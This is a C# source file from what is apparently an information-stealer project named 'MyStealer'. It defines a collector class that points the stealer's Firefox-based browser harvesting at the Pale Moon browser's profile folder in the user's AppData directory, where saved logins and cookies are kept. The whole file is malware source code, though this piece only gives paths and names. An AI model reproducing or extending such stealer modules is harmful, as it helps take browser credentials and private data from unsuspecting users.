using System;
using System.IO;

namespace MyStealer.Collectors.Browser.FirefoxBased
{
    internal class PaleMoon : Firefox
    {
        public override string ApplicationName => "Pale Moon";
        
        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Moonchild Productions", "Pale Moon", "Profiles");
        
        public override string[] LibDirectory => new string[] { "Pale Moon" };
    }
}
